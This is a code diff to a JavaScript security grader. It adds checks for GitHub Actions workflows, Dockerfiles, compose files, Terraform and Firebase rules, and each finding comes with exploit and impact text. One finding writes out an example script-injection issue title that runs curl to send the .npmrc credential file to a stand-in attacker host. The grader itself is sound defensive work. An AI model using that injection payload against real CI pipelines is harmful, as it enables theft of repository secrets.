@@ -675,10 +675,14 @@ function gradeRoutes(model, ledger, findings, allow) {
   const matchers = (mw.matchers || []).map(m => m.matcher)
 
   for (const r of model.routes || []) {
-    const subject = `route:${r.file}`
+    // A Next.js route IS a file, so the path identifies it. An Express/Fastify/Nest route is a
+    // CALL, and one file declares many — so the method+path is part of the subject or two of them
+    // would collide, which LAW 2 treats as two rules disagreeing and throws on.
+    const subject = r.routeKey ? `route:${r.file}:${r.routeKey}` : `route:${r.file}`
     if (allow.has(subject)) { ledger.record('routes', subject, 'allowlisted', 'user allowlist'); continue }
 
-    const urlPath = urlPathOf(r.file)
+    // A call-declared route states its own path literally; only a file-routed one has to be derived.
+    const urlPath = r.urlPath || urlPathOf(r.file)
     const mwCovers = mwAuth && (matchers.length ? matchers.some(m => matcherCovers(m, urlPath)) : true)
 
     // Impact-if-true, decided once: a route holding the service-role key bypasses RLS entirely,
@@ -702,7 +706,7 @@ function gradeRoutes(model, ledger, findings, allow) {
         title_he: `לנתיב ${urlPath} אין אימות גלוי`,
         severity, evidence: 'weak',
         why: 'Neither the handler nor a middleware matcher that covers this path contains any recognisable authentication.',
-        at: firstAt(r.file),
+        at: firstAt(r.file, r.line ?? null),
         exploit: `Anyone sends ${r.methods.join('/')} to ${urlPath} without logging in.`,
         impact: usesServiceRole
           ? 'The handler reaches the service-role key, which bypasses RLS, so an anonymous caller acts as database owner.'
@@ -736,7 +740,7 @@ function gradeRoutes(model, ledger, findings, allow) {
         title_he: `הנתיב ${urlPath} אינו מאמת את גוף הבקשה`,
         severity: 'P2', evidence: 'weak',
         why: 'No schema validation call appears in the handler.',
-        at: firstAt(r.file),
+        at: firstAt(r.file, r.line ?? null),
         exploit: 'A caller sends fields the handler never expected and they flow into the database or a downstream call.',
         impact: 'Mass-assignment and type-confusion bugs, and a much larger surface for every other weakness.',
         guard: 'guard-recipes/zod-validation.md',
@@ -755,7 +759,7 @@ function gradeRoutes(model, ledger, findings, allow) {
         title_he: `לנקודת הקצה ${urlPath} לאימות משתמשים אין הגבלת קצב`,
         severity: 'P2', evidence: 'weak',
         why: 'The path looks like a credential endpoint and no rate-limiting call appears in the handler.',
-        at: firstAt(r.file),
+        at: firstAt(r.file, r.line ?? null),
         exploit: 'An attacker submits passwords or one-time codes as fast as the server will answer.',
         impact: 'Credential stuffing and OTP brute force against your users\' accounts.',
         guard: 'guard-recipes/rate-limiting.md',
@@ -775,7 +779,7 @@ function gradeRoutes(model, ledger, findings, allow) {
         title_he: `הנתיב ${urlPath} מאחזר רשומה לפי מזהה ללא בדיקת בעלות`,
         severity: 'P1', evidence: 'weak',
         why: 'The handler reads an id from the request and holds a service-role client, which bypasses RLS, yet no ownership column is compared anywhere in the file.',
-        at: firstAt(r.file),
+        at: firstAt(r.file, r.line ?? null),
         exploit: 'A signed-in user changes the id in the URL and reads or edits another user\'s record.',
         impact: 'Every record reachable through this route is readable by any caller who can guess an id.',
         guard: 'guard-recipes/auth-middleware.md',
@@ -1084,6 +1088,512 @@ function gradeMobile(model, ledger, findings, allow) {
 }
 
 // ---------------------------------------------------------------------------
+// CI/CD, infrastructure as code, and Firebase rules
+//
+// AUDIT FIX C. These three domains were DISCOVERED by the engine and graded by nothing, which is
+// the mobile defect repeating: a workflow that hands repo secrets to a forked pull request, a
+// Dockerfile with a baked live key, and `allow read, write: if true` on a Firestore database all
+// produced exactly the same report as a repo that had none of them — a clean one.
+//
+// The rule the whole fix is built on: GRADE OR DECLARE. Every artifact class the engine can see
+// either gets a rule that walks it, or gets a row in the ledger saying it was seen and not graded.
+// Silence is the one thing it may never produce, because a reader cannot tell silence from safety.
+// ---------------------------------------------------------------------------
+
+function gradeCiWorkflows(model, ledger, findings, allow) {
+  ledger.declare('ciWorkflows')
+  // A trigger a fork can fire. `pull_request` gets no secrets and no write token, so it is safe by
+  // design; these three run with the base repository's permissions.
+  const FORK_REACHABLE = new Set(['pull_request_target', 'workflow_run', 'issue_comment'])
+
+  for (const w of model.ci || []) {
+    const subject = `workflow:${w.file}`
+    if (allow.has(subject)) { ledger.record('ciWorkflows', subject, 'allowlisted', 'user allowlist'); continue }
+    const problems = []
+
+    if (w.untrustedCheckout && w.triggers.includes('pull_request_target')) {
+      // The most dangerous shape in GitHub Actions, and it is entirely readable from the file:
+      // `pull_request_target` grants the workflow the base repo's secrets and a write token, and
+      // the checkout replaces the code with the fork's. Anything that runs afterwards is the
+      // attacker's code holding your credentials — `npm ci` alone suffices, because an install
+      // script in their package.json runs at that moment.
+      findings.push(finding({
+        id: 'CG-CI-001', subject,
+        title_en: 'Workflow runs code from a forked pull request with your secrets',
+        title_he: 'תהליך העבודה מריץ קוד מבקשת משיכה חיצונית עם הסודות שלכם',
+        severity: 'P0',
+        evidence: w.executesAfterCheckout ? 'definitive' : 'strong',
+        why: w.executesAfterCheckout
+          ? `The workflow triggers on pull_request_target, checks out ${w.untrustedCheckout.ref}, and then executes steps — so a fork's code runs with this repository's secrets.`
+          : `The workflow triggers on pull_request_target and checks out ${w.untrustedCheckout.ref}; no execution step was identified after it, but the untrusted code is now on disk.`,
+        at: firstAt(w.file, w.untrustedCheckout.line, w.untrustedCheckout.ref),
+        exploit: 'Anyone opens a pull request from a fork. Their code runs on your runner and can print, exfiltrate, or use every secret the workflow can read.',
+        impact: 'Every secret in this repository must be considered readable by any stranger who can open a PR — deploy keys, cloud credentials, npm tokens.',
+        guard: 'guard-recipes/ci-hardening.md#pull-request-target',
+        cwe: 'CWE-829', owasp: 'A08:2021',
+        assumption: w.executesAfterCheckout ? null : 'That no later step executes the checked-out code.',
+      }))
+      problems.push('untrusted checkout under pull_request_target')
+    }
+
+    for (const inj of w.scriptInjections) {
+      findings.push(finding({
+        id: 'CG-CI-002', subject,
+        title_en: `Attacker-controlled text is interpolated into a shell command (${inj.expr})`,
+        title_he: `טקסט בשליטת תוקף מוטמע בפקודת מעטפת (${inj.expr})`,
+        severity: 'P1', evidence: 'definitive',
+        why: `\${{ ${inj.expr} }} is substituted into the run: script BEFORE the shell parses it, so its contents become part of the command.`,
+        at: firstAt(w.file, inj.line, `\${{ ${inj.expr} }}`),
+        exploit: 'Someone opens an issue titled `a"; curl attacker.site/$(cat $HOME/.npmrc); #` and the runner executes it.',
+        impact: 'Arbitrary commands on your runner, with whatever secrets that job can read.',
+        guard: 'guard-recipes/ci-hardening.md#script-injection',
+        cwe: 'CWE-78', owasp: 'A03:2021', autofixable: true,
+      }))
+      problems.push(`script injection via ${inj.expr}`)
+    }
+
+    // Only third-party actions. A movable tag is a real risk everywhere, but the attack that keeps
+    // happening is a compromised independent maintainer — and reporting `actions/checkout@v4` in
+    // every repository on earth would train people to skim past this whole section.
+    const thirdPartyUnpinned = w.unpinnedActions.filter(a => !a.firstParty)
+    if (thirdPartyUnpinned.length) {
+      const a = thirdPartyUnpinned[0]
+      findings.push(finding({
+        id: 'CG-CI-003', subject,
+        title_en: `Third-party action "${a.action}" is used by a movable tag`,
+        title_he: `הפעולה החיצונית "${a.action}" משמשת דרך תגית שניתן להזיז`,
+        severity: 'P2', evidence: 'definitive',
+        why: `\`uses: ${a.action}@${a.ref}\` resolves a tag or branch at run time, and whoever owns that repository can point it at different code without any change here.`,
+        at: firstAt(w.file, a.line, `uses: ${a.action}@${a.ref}`),
+        exploit: 'The action\'s maintainer is compromised, the tag is repointed, and your next CI run executes their code with your secrets.',
+        impact: 'Full compromise of the workflow: its secrets, its token, and anything it deploys.',
+        guard: 'guard-recipes/ci-hardening.md#pin-actions',
+        cwe: 'CWE-829', owasp: 'A08:2021',
+        assumption: `That this action's owner is outside your control. ${thirdPartyUnpinned.length} unpinned third-party action(s) in this workflow.`,
+      }))
+      problems.push(`${thirdPartyUnpinned.length} unpinned third-party action(s)`)
+    }
+
+    if (w.selfHosted && w.triggers.some(t => FORK_REACHABLE.has(t) || t === 'pull_request')) {
+      findings.push(finding({
+        id: 'CG-CI-004', subject,
+        title_en: 'A self-hosted runner is reachable from a fork-triggered workflow',
+        title_he: 'ראנר בשרת עצמי נגיש מתהליך שמופעל על ידי מאגר מפוצל',
+        severity: 'P1', evidence: 'strong',
+        why: `runs-on names a self-hosted runner and this workflow triggers on ${w.triggers.join(', ')}, which a fork can fire.`,
+        at: firstAt(w.file, w.selfHosted.line),
+        exploit: 'An attacker opens a pull request; their code runs on your machine, which is not destroyed afterwards.',
+        impact: 'Code execution on hardware you own, plus persistence into later jobs on the same runner.',
+        guard: 'guard-recipes/ci-hardening.md#self-hosted',
+        cwe: 'CWE-269',
+        assumption: 'That this repository accepts pull requests from forks, and that the runner is not ephemeral.',
+      }))
+      problems.push('self-hosted runner on a fork-reachable trigger')
+    }
+
+    if (!w.declaresPermissions && !w.declaresJobPermissions) {
+      // Deliberately weak evidence: the effective default is an ORG/REPO setting we cannot read
+      // from the repository. New repositories default to read-only; older ones are still write-all.
+      findings.push(finding({
+        id: 'CG-CI-005', subject,
+        title_en: 'Workflow declares no `permissions:` block',
+        title_he: 'תהליך העבודה אינו מגדיר בלוק `permissions:`',
+        severity: 'P3', evidence: 'weak',
+        why: 'No permissions block is declared, so the GITHUB_TOKEN scope comes from a repository or organisation default that cannot be read from this repo.',
+        at: firstAt(w.file),
+        exploit: 'If the default is write-all, any step — including a compromised action — can push commits, edit releases, or open a pull request as the repository.',
+        impact: 'Depends on a setting outside this file. Declaring the block makes it depend on the file instead.',
+        guard: 'guard-recipes/ci-hardening.md#least-privilege-token',
+        cwe: 'CWE-269', autofixable: true,
+        assumption: 'That the repository default is not already read-only, which newer GitHub defaults set.',
+      }))
+      problems.push('no permissions block')
+    }
+
+    for (const s of w.secretsInRunScript) {
+      findings.push(finding({
+        id: 'CG-CI-006', subject,
+        title_en: 'A secret is interpolated directly into a shell script',
+        title_he: 'סוד מוטמע ישירות בסקריפט מעטפת',
+        severity: 'P3', evidence: 'weak',
+        why: 'A `${{ secrets.* }}` expression is substituted into a run: script rather than passed through `env:`.',
+        at: firstAt(w.file, s.line),
+        exploit: 'Actions redacts exact secret values from logs, but not transformed ones — a `base64`, `cut` or `jq` of the value prints in the clear.',
+        impact: 'A secret readable in a public build log, which is indexed and archived.',
+        guard: 'guard-recipes/ci-hardening.md#least-privilege-token',
+        cwe: 'CWE-532',
+        assumption: 'That the script transforms or forwards the value rather than only passing it to a tool that handles it safely.',
+      }))
+      problems.push('secret interpolated into a run script')
+    }
+
+    ledger.record('ciWorkflows', subject, problems.length ? 'fail' : 'pass',
+      problems.length
+        ? problems.join('; ')
+        : `${w.actionsTotal} action(s), permissions declared, no fork-reachable execution of untrusted code`)
+  }
+}
+
+function gradeIac(model, ledger, findings, allow) {
+  ledger.declare('iacFiles')
+  const iac = model.iac || {}
+
+  for (const d of iac.dockerfiles || []) {
+    const subject = `dockerfile:${d.file}`
+    if (allow.has(subject)) { ledger.record('iacFiles', subject, 'allowlisted', 'user allowlist'); continue }
+    const problems = []
+
+    for (const s of d.bakedSecrets) {
+      // A NAME plus a real VALUE in a committed file. The value is what lifts this past LAW 3 for
+      // the high-confidence tier; a credential-shaped name alone stays at P2 with nameOnly set.
+      const high = s.secretClass === 'high'
+      findings.push(finding({
+        id: 'CG-IAC-001', subject,
+        title_en: `Secret "${s.name}" is baked into the image`,
+        title_he: `הסוד "${s.name}" מוטמע בתוך האימג'`,
+        severity: high ? 'P0' : 'P2',
+        evidence: high ? 'definitive' : 'weak', nameOnly: !high,
+        why: `${s.directive} assigns a literal value to ${s.name}, which is stored in the image layer and readable with \`docker history\`.`,
+        at: firstAt(d.file, s.line, `${s.directive} ${s.name}=…`),
+        exploit: 'Anyone who can pull the image reads the value. Deleting the line in a later layer does not remove it.',
+        impact: high
+          ? 'Whatever the credential grants, to anyone with the image or the repository. Rotate it — it is in every build you pushed.'
+          : 'Depends on the value. If it grants access, rotate it; if it is a public identifier, allowlist it.',
+        guard: 'guard-recipes/container-iac.md#no-baked-secrets',
+        cwe: 'CWE-798', owasp: 'A05:2021',
+        assumption: high ? 'That the value is live. Rotate regardless — it is in the image history.' : 'That this value grants privileged access rather than being a public identifier.',
+      }))
+      problems.push(`baked secret ${s.name}`)
+    }
+
+    if (!d.setsUser) {
+      findings.push(finding({
+        id: 'CG-IAC-002', subject,
+        title_en: 'Container runs as root',
+        title_he: 'הקונטיינר רץ כמשתמש root',
+        severity: 'P3', evidence: 'definitive',
+        why: 'The Dockerfile declares no non-root USER, so every process in the container runs as uid 0.',
+        at: firstAt(d.file, d.baseImage?.line ?? null),
+        exploit: 'Any code-execution bug in the app becomes root inside the container, which is the first half of a container escape.',
+        impact: 'Turns a contained bug into a host-level one. On its own it breaks nothing.',
+        guard: 'guard-recipes/container-iac.md#run-as-non-root',
+        cwe: 'CWE-250', autofixable: true,
+      }))
+      problems.push('no USER directive')
+    }
+
+    if (d.remoteScript) {
+      findings.push(finding({
+        id: 'CG-IAC-003', subject,
+        title_en: 'Build pipes a remote script straight into a shell',
+        title_he: 'תהליך הבנייה מריץ סקריפט מרוחק ישירות במעטפת',
+        severity: 'P2', evidence: 'definitive',
+        why: 'A RUN step fetches a script over the network and executes it, with no checksum and no pinned version.',
+        at: firstAt(d.file, d.remoteScript.line),
+        exploit: 'Whoever controls that URL — or anyone who can intercept it — chooses what runs inside your build.',
+        impact: 'Arbitrary code in every image you build, including your production one.',
+        guard: 'guard-recipes/container-iac.md#pin-base-images',
+        cwe: 'CWE-494', owasp: 'A08:2021',
+      }))
+      problems.push('curl | sh in build')
+    }
+
+    if (d.baseImage && !d.baseImage.pinned && d.baseImage.latest) {
+      findings.push(finding({
+        id: 'CG-IAC-004', subject,
+        title_en: `Base image "${d.baseImage.ref}" is unpinned`,
+        title_he: `אימג' הבסיס "${d.baseImage.ref}" אינו מקובע`,
+        severity: 'P3', evidence: 'definitive',
+        why: 'The FROM line names a floating tag rather than a digest, so two builds of the same commit can produce different images.',
+        at: firstAt(d.file, d.baseImage.line, `FROM ${d.baseImage.ref}`),
+        exploit: 'A moved or compromised upstream tag lands in your next deploy with no change on your side.',
+        impact: 'Unreproducible builds, and an upstream supply-chain change you never approved.',
+        guard: 'guard-recipes/container-iac.md#pin-base-images',
+        cwe: 'CWE-1104',
+      }))
+      problems.push('unpinned base image')
+    }
+
+    ledger.record('iacFiles', subject, problems.length ? 'fail' : 'pass',
+      problems.length ? problems.join(', ') : 'non-root user, pinned base, no baked secrets')
+  }
+
+  for (const c of iac.compose || []) {
+    const subject = `compose:${c.file}`
+    if (allow.has(subject)) { ledger.record('iacFiles', subject, 'allowlisted', 'user allowlist'); continue }
+    const problems = []
+
+    if (c.dockerSocket) {
+      findings.push(finding({
+        id: 'CG-IAC-005', subject,
+        title_en: 'The Docker socket is mounted into a container',
+        title_he: 'שקע ה-Docker מחובר לתוך קונטיינר',
+        severity: 'P1', evidence: 'definitive',
+        why: '/var/run/docker.sock is bind-mounted, which gives the container full control of the Docker daemon.',
+        at: firstAt(c.file, c.dockerSocket.line, '/var/run/docker.sock'),
+        exploit: 'Anything running in that container starts a new privileged container mounting the host filesystem — that is host root, by design.',
+        impact: 'The container boundary does not exist for this service.',
+        guard: 'guard-recipes/container-iac.md#compose-exposure',
+        cwe: 'CWE-250',
+      }))
+      problems.push('docker socket mounted')
+    }
+    if (c.privileged) {
+      findings.push(finding({
+        id: 'CG-IAC-006', subject,
+        title_en: 'A service runs privileged',
+        title_he: 'שירות רץ במצב privileged',
+        severity: 'P1', evidence: 'definitive',
+        why: '`privileged: true` disables nearly every isolation feature the container runtime provides.',
+        at: firstAt(c.file, c.privileged.line, 'privileged: true'),
+        exploit: 'A process in the container reaches host devices and kernel interfaces directly.',
+        impact: 'Container escape becomes straightforward rather than a chain of bugs.',
+        guard: 'guard-recipes/container-iac.md#compose-exposure',
+        cwe: 'CWE-250',
+      }))
+      problems.push('privileged service')
+    }
+    for (const p of c.exposedDbPorts) {
+      findings.push(finding({
+        id: 'CG-IAC-007', subject,
+        title_en: `${p.service} port ${p.port} is published to every interface`,
+        title_he: `הפורט ${p.port} של ${p.service} נחשף לכל הממשקים`,
+        severity: 'P1', evidence: 'definitive',
+        why: `The ports mapping binds ${p.bind}, so the database listens on every interface of the host rather than only on the compose network.`,
+        at: firstAt(c.file, p.line, `${p.port}:${p.port}`),
+        exploit: 'Anyone who can reach the host connects to the database directly, bypassing your application entirely.',
+        impact: 'On a host without a firewall this is the open internet — the usual route to an unauthenticated database in a ransom note.',
+        guard: 'guard-recipes/container-iac.md#compose-exposure',
+        cwe: 'CWE-668', owasp: 'A05:2021', autofixable: true,
+        assumption: 'That this compose file is used somewhere reachable rather than only on a developer laptop.',
+      }))
+      problems.push(`${p.service} published on ${p.bind}`)
+    }
+    for (const s of c.bakedSecrets) {
+      const high = s.secretClass === 'high'
+      findings.push(finding({
+        id: 'CG-IAC-008', subject,
+        title_en: `Secret "${s.name}" is written into the compose file`,
+        title_he: `הסוד "${s.name}" כתוב בתוך קובץ ה-compose`,
+        severity: high ? 'P1' : 'P2',
+        evidence: high ? 'definitive' : 'weak', nameOnly: !high,
+        why: `${s.name} is assigned a literal value in a file that is committed to the repository.`,
+        at: firstAt(c.file, s.line, `${s.name}=…`),
+        exploit: 'Anyone who can read the repository reads the value.',
+        impact: high ? 'Whatever the credential grants. Rotate it and move the value to an env file that is not committed.' : 'Depends on the value.',
+        guard: 'guard-recipes/container-iac.md#no-baked-secrets',
+        cwe: 'CWE-798',
+        assumption: high ? 'That the value is live rather than a local development placeholder.' : 'That this value grants privileged access.',
+      }))
+      problems.push(`literal ${s.name}`)
+    }
+    if (c.hostNetwork) {
+      findings.push(finding({
+        id: 'CG-IAC-009', subject,
+        title_en: 'A service uses the host network directly',
+        title_he: 'שירות משתמש ישירות ברשת המארח',
+        severity: 'P2', evidence: 'definitive',
+        why: '`network_mode: host` removes network namespacing, so the container shares the host\'s interfaces and every port it opens is a host port.',
+        at: firstAt(c.file, c.hostNetwork.line, 'network_mode: host'),
+        exploit: 'Every port the service binds is exposed wherever the host is reachable, and the container can reach host-local services meant to be private.',
+        impact: 'Port-level isolation between the container and the host is gone.',
+        guard: 'guard-recipes/container-iac.md#compose-exposure',
+        cwe: 'CWE-668',
+      }))
+      problems.push('host network mode')
+    }
+
+    ledger.record('iacFiles', subject, problems.length ? 'fail' : 'pass',
+      problems.length ? problems.join(', ') : 'no privileged service, socket mount, or published database port')
+  }
+
+  for (const t of iac.terraform || []) {
+    const subject = `terraform:${t.file}`
+    if (allow.has(subject)) { ledger.record('iacFiles', subject, 'allowlisted', 'user allowlist'); continue }
+    const problems = []
+
+    for (const ing of t.openIngress) {
+      findings.push(finding({
+        id: 'CG-IAC-010', subject,
+        title_en: `Ingress from 0.0.0.0/0 on ports ${ing.portRange}`,
+        title_he: `תעבורה נכנסת מ-0.0.0.0/0 בפורטים ${ing.portRange}`,
+        severity: 'P1', evidence: 'definitive',
+        why: `A rule allows 0.0.0.0/0 on ${ing.portRange}. Public 80/443 is excluded by this rule as normal for a web server; this range is not.`,
+        at: firstAt(t.file, ing.line, '0.0.0.0/0'),
+        exploit: 'Anyone on the internet connects to that port directly — a database, an admin panel, or SSH.',
+        impact: 'The service is exposed to untargeted internet-wide scanning, which finds it within hours.',
+        guard: 'guard-recipes/container-iac.md#terraform-network',
+        cwe: 'CWE-284', owasp: 'A01:2021',
+        assumption: 'That this rule is applied to a resource that is actually deployed, and that the port range is not fronted by something that authenticates.',
+      }))
+      problems.push(`open ingress ${ing.portRange}`)
+    }
+    if (t.publicAcl) {
+      findings.push(finding({
+        id: 'CG-IAC-011', subject,
+        title_en: 'Object storage is configured with a public ACL',
+        title_he: 'אחסון האובייקטים מוגדר עם הרשאת גישה ציבורית',
+        severity: 'P1', evidence: 'definitive',
+        why: `The configuration sets ${t.publicAcl.match}, which makes the bucket's objects readable without credentials.`,
+        at: firstAt(t.file, t.publicAcl.line, t.publicAcl.match),
+        exploit: 'Anyone who learns or guesses the bucket name lists and downloads its contents.',
+        impact: 'Everything in the bucket is public, including anything a user uploaded expecting privacy.',
+        guard: 'guard-recipes/container-iac.md#terraform-network',
+        cwe: 'CWE-284', owasp: 'A01:2021',
+        assumption: 'That the bucket holds anything not intended for the public. A CDN asset bucket is a legitimate use — allowlist it.',
+      }))
+      problems.push('public bucket ACL')
+    }
+    if (t.publiclyAccessible) {
+      findings.push(finding({
+        id: 'CG-IAC-012', subject,
+        title_en: 'A managed database is marked publicly accessible',
+        title_he: 'מסד נתונים מנוהל מסומן כנגיש לציבור',
+        severity: 'P1', evidence: 'definitive',
+        why: '`publicly_accessible = true` gives the instance a public endpoint, so its exposure depends entirely on the security group.',
+        at: firstAt(t.file, t.publiclyAccessible.line, t.publiclyAccessible.match),
+        exploit: 'The database answers from the internet; only the security group stands between it and a scanner.',
+        impact: 'One over-broad rule away from a fully exposed database.',
+        guard: 'guard-recipes/container-iac.md#terraform-network',
+        cwe: 'CWE-668',
+      }))
+      problems.push('publicly accessible database')
+    }
+    for (const s of t.literalSecrets) {
+      findings.push(finding({
+        id: 'CG-IAC-013', subject,
+        title_en: `Credential "${s.name}" is hardcoded in Terraform`,
+        title_he: `פרטי ההזדהות "${s.name}" כתובים ישירות בקוד ה-Terraform`,
+        severity: 'P1', evidence: 'strong',
+        why: `${s.name} is assigned a string literal rather than a variable or a secret-manager reference.`,
+        at: firstAt(t.file, s.line, `${s.name} = "…"`),
+        exploit: 'Anyone who can read the repository reads the credential, and it is also copied into the state file.',
+        impact: 'Whatever the credential grants. Rotate it and move it to a secret manager.',
+        guard: 'guard-recipes/container-iac.md#no-baked-secrets',
+        cwe: 'CWE-798', owasp: 'A05:2021',
+        assumption: 'That the literal is a live credential rather than a placeholder for a local run.',
+      }))
+      problems.push(`hardcoded ${s.name}`)
+    }
+
+    ledger.record('iacFiles', subject, problems.length ? 'fail' : 'pass',
+      problems.length ? problems.join(', ') : 'no world-open ingress, public storage, or hardcoded credential')
+  }
+
+  for (const f of iac.stateFiles || []) {
+    const subject = `terraform-state:${f}`
+    if (allow.has(subject)) { ledger.record('iacFiles', subject, 'allowlisted', 'user allowlist'); continue }
+    findings.push(finding({
+      id: 'CG-IAC-014', subject,
+      title_en: 'A Terraform state file is committed to the repository',
+      title_he: 'קובץ מצב של Terraform נשמר במאגר',
+      severity: 'P0', evidence: 'definitive',
+      why: 'State records every attribute of every resource in plaintext, including generated passwords, private keys and connection strings.',
+      at: firstAt(f),
+      exploit: 'Anyone who can read the repository — or its history — opens the file and reads the credentials directly.',
+      impact: 'Every secret your infrastructure generated is disclosed. No scanner rule catches these, because the values have no recognisable prefix.',
+      guard: 'guard-recipes/container-iac.md#terraform-state',
+      cwe: 'CWE-538', owasp: 'A05:2021',
+      assumption: 'That the state describes real infrastructure rather than a throwaway local example.',
+    }))
+    ledger.record('iacFiles', subject, 'fail', 'state file committed')
+  }
+}
+
+function gradeFirebaseRules(model, ledger, findings, allow) {
+  ledger.declare('firebaseRules')
+  for (const r of model.firebaseRules || []) {
+    const subject = `firebase-rules:${r.file}`
+    if (allow.has(subject)) { ledger.record('firebaseRules', subject, 'allowlisted', 'user allowlist'); continue }
+
+    if (r.openRules.length) {
+      const o = r.openRules[0]
+      const ops = (o.ops || []).join(', ') || 'read, write'
+      const writable = /write|create|update|delete/.test(ops)
+      findings.push(finding({
+        id: 'CG-FB-001', subject,
+        title_en: `Firebase rules allow ${ops} to anyone`,
+        title_he: `כללי Firebase מתירים ${ops} לכל אחד`,
+        severity: 'P0', evidence: 'definitive',
+        why: `A rule grants \`${ops}\` with the condition \`true\`, which every request satisfies — including one with no account at all.`,
+        at: firstAt(r.file, o.line, `allow ${ops}: if true`),
+        exploit: 'The Firebase config object ships in your client bundle by design. Anyone reads it out of DevTools and queries the database directly with the SDK.',
+        impact: writable
+          ? 'Anyone can read, modify and delete everything this rule covers. This is the Firebase equivalent of running with no access control at all.'
+          : 'Everything this rule covers is world-readable, including anything a user uploaded expecting privacy.',
+        guard: 'guard-recipes/firebase-rules.md#owner-scoped',
+        cwe: 'CWE-284', owasp: 'A01:2021', autofixable: false,
+        assumption: 'That this path holds anything not intended to be public. A deliberately public collection is a legitimate use — allowlist it.',
+      }))
+      ledger.record('firebaseRules', subject, 'fail', `${r.openRules.length} rule(s) with an unconditional \`true\``)
+      continue
+    }
+
+    if (r.authOnlyRules.length) {
+      const o = r.authOnlyRules[0]
+      const ops = (o.ops || []).join(', ') || 'read, write'
+      findings.push(finding({
+        id: 'CG-FB-002', subject,
+        title_en: `Firebase rules grant ${ops} to any signed-in user`,
+        title_he: `כללי Firebase מעניקים ${ops} לכל משתמש מחובר`,
+        severity: 'P1', evidence: 'definitive',
+        why: '`request.auth != null` checks that the caller is signed in, and nothing else. It is not compared against any field on the document, so it does not scope anything.',
+        at: firstAt(r.file, o.line, `allow ${ops}: if request.auth != null`),
+        exploit: 'An attacker signs up through your own sign-up form — that takes seconds — and then reads or writes every other user\'s documents.',
+        impact: 'A cross-tenant leak: every customer\'s data is available to every other customer.',
+        guard: 'guard-recipes/firebase-rules.md#any-authenticated',
+        cwe: 'CWE-639', owasp: 'A01:2021',
+        assumption: 'That the documents under this path are per-user rather than genuinely shared between all signed-in users.',
+      }))
+      ledger.record('firebaseRules', subject, 'fail', `${r.authOnlyRules.length} rule(s) scoped only to "any signed-in user"`)
+      continue
+    }
+
+    // Structural pass: every allow rule in the file carries a condition that is neither `true` nor
+    // the bare signed-in check. What those conditions actually compare is not verified here — the
+    // auditors read them — so this is a pass on the two catastrophic shapes, not on the rules.
+    ledger.record('firebaseRules', subject, 'pass',
+      `${r.dialect} rules: no unconditional or signed-in-only grant`)
+  }
+}
+
+/**
+ * GRADE OR DECLARE — the safety net.
+ *
+ * Every rule above walks a subject set. This walks what is LEFT: artifact classes the engine
+ * discovered and no rule owns, plus enumeration gaps the engine reported. Without it, adding a new
+ * artifact type to the engine silently widens the blind spot, because a class with no rule produces
+ * no rows and a reader cannot tell an unexamined domain from a clean one.
+ *
+ * Everything here is `undeterminable` on purpose. That is the honest disposition for "we saw this
+ * and did not grade it", and it puts the row in the same coverage table as everything else.
+ */
+function declareUngradedSurfaces(model, ledger) {
+  ledger.declare('ungradedSurfaces')
+  const a = model.artifacts || {}
+
+  // Electron main-process files. `nodeIntegration: true` / `contextIsolation: false` are readable
+  // facts, but no rule reads them yet, so the class is declared rather than left silent.
+  for (const f of a.electronMain || []) {
+    ledger.record('ungradedSurfaces', `electron:${f}`, 'undeterminable',
+      'this file configures an Electron BrowserWindow; the static tier does not grade nodeIntegration / contextIsolation / webSecurity yet — review it against guard-recipes/electron-hardening.md')
+  }
+
+  // A server framework that declares no routes we could find. The `routes` set would otherwise
+  // report a confident 0.
+  for (const gap of model.discovery?.routes?.frameworkGaps || []) {
+    ledger.record('ungradedSurfaces', `route-framework:${gap.framework}`, 'undeterminable', gap.reason)
+  }
+
+  // Kubernetes manifests. The engine identifies them by content but has no rules for them, so a
+  // repository whose entire deployment lives in Kubernetes must not read as fully examined.
+  for (const f of model.iac?.k8sManifests || []) {
+    ledger.record('ungradedSurfaces', `k8s:${f}`, 'undeterminable',
+      'this is a Kubernetes manifest; the static tier does not grade privileged securityContexts, hostPath mounts, or secrets held in a manifest — review it against guard-recipes/container-iac.md')
+  }
+}
+
+// ---------------------------------------------------------------------------
 // Live and DAST observations
 //
 // The probes observe; they do not judge. Each observation names a `kind`, and the mapping from
@@ -1352,13 +1862,36 @@ function gradeScanners(scanners, ledger, findings, allow) {
   if (dep) {
     ledger.declare('dependencies')
     if (!dep.ran) {
+      // The adapter's own reason is far more actionable than a generic one: "npm needs a lockfile
+      // and this project has none committed" tells the user what to do, where "no auditor was
+      // available" sends them looking for a tool they already have.
+      const why = (dep.unparsed || []).map(u => u.reason).filter(Boolean)
       ledger.record('scanCoverage', 'scan:dependencies', 'undeterminable',
-        'no dependency auditor was available — the lockfile was not checked against advisories')
+        why.length ? why.join('; ')
+          : 'no dependency auditor was available — the lockfile was not checked against advisories')
     } else {
-      ledger.record('scanCoverage', 'scan:dependencies', 'pass', 'a dependency auditor ran against the manifest')
+      // An auditor that ran and produced output we could not read is NOT a completed check. Before
+      // audit fix C the adapter emitted pnpm/pip/osv results in their native shapes, the grader's
+      // reader found nothing in them, and the row said `pass` — "checked, nothing found" over an
+      // ecosystem nobody had actually parsed. A gap has to be louder than a clean result, not
+      // quieter.
+      const unparsed = dep.unparsed || []
+      if (unparsed.length) {
+        ledger.record('scanCoverage', 'scan:dependencies', 'undeterminable',
+          `a dependency auditor ran but ${unparsed.length} result set(s) could not be read: ` +
+          unparsed.map(u => `${u.tool} (${u.reason})`).join('; '))
+      } else {
+        ledger.record('scanCoverage', 'scan:dependencies', 'pass', 'a dependency auditor ran against the manifest')
+      }
+      // One package can carry several advisories, and two tools can report the same package. The
+      // subject is the package, so the second row would collide — and LAW 2 answers a collision
+      // with a throw, which would crash the scan instead of reporting it.
+      const seenDeps = new Set()
       for (const res of dep.results || []) {
         for (const v of res.vulnerabilities || []) {
           const subject = `dependency:${res.ecosystem}:${v.name}`
+          if (seenDeps.has(subject)) continue
+          seenDeps.add(subject)
           if (allow.has(subject)) { ledger.record('dependencies', subject, 'allowlisted', 'user allowlist'); continue }
           const label = String(v.advisorySeverity ?? v.severity ?? 'moderate').toLowerCase()
           findings.push(finding({
@@ -1606,8 +2139,14 @@ export function grade(model, opts = {}) {
   gradeLlmSites(model, ledger, findings, allow)
   gradeSupabaseClients(model, ledger, findings, allow)
   gradeMobile(model, ledger, findings, allow)
+  gradeCiWorkflows(model, ledger, findings, allow)
+  gradeIac(model, ledger, findings, allow)
+  gradeFirebaseRules(model, ledger, findings, allow)
   gradeObservations(opts.observations, ledger, findings)
   gradeScanners(opts.scanners, ledger, findings, allow)
